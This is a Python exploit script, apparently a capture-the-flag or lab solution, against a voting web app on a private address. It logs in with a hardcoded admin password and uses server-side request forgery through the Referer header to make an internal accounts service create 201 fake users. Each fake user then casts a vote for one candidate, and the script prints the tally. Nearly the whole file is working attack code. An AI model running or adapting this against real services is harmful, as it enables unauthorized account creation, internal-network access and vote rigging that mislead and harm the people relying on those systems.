#!/usr/bin/env python3

from requests import session
from base64 import b64decode

BASE_URI = "http://172.27.0.3:5000/"
INDEX_ENDPOINT   = BASE_URI+"/"
LOGIN_ENDPOINT   = BASE_URI+"/login"
VOTE_ENDPOINT    = BASE_URI+"/vote"
RESULTS_ENDPOINT = BASE_URI+"/results"

# Open admin session
admin_session = session()
# Login as admin
admin_credentials = {
    'username': 'admin',
    'password': 'cyberpunk'
}
admin_session.post(LOGIN_ENDPOINT, data=admin_credentials)

# Vote as admin
admin_session.post(VOTE_ENDPOINT, data={'candidate': 'opposition'})

# Create 200 user accounts via SSRF on referer header
for i in range(201):
    username = f"user_{i}"
    password = "password"
    create_account_url = f"http://accounts-app:8080/create-account?username={username}&password={password}"
    admin_session.get(INDEX_ENDPOINT, headers={"Referer":create_account_url})
    print(f"Created account: {username}")


# Function to login and vote for a given user
def login_and_vote(username, password):
    user_session = session()
    login_response = user_session.post(LOGIN_ENDPOINT, data={'username': username, 'password': password})
    if login_response.status_code == 200:
        vote_response = user_session.post(VOTE_ENDPOINT, data={'candidate': 'opposition'})
        print(f"Vote for {username}: {vote_response.status_code}")
    else:
        print(f"Failed to login for {username}: {login_response.status_code}")

# Login and vote for each created user
for i in range(201):
    username = f"user_{i}"
    password = "password"
    login_and_vote(username, password)



# Check final results
final_results = admin_session.get(RESULTS_ENDPOINT)
print(final_results.text)